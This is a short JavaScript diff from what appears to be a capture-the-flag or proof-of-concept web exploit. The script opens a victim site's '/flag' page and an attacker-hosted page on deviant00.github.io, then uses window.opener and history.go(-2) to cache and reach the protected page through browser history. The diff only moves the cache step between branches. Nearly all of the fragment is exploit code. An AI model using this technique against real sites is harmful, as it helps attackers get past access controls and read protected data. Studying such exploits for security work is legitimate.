@@ -5,10 +5,10 @@
     const domain = 'http://deviant00.github.io';
     const name = 'WIN'
     if (!opener) {
-        open(`${victim}/flag`); // cache flag
         open(`${domain}/poc`); // opener
         location = `${victim}/flag`; // unauthorized
     } else {
+        open(`${victim}/flag`); // cache flag
         open(`${domain}/x`, 'WIN');
         opener.history.go(-2);
     }
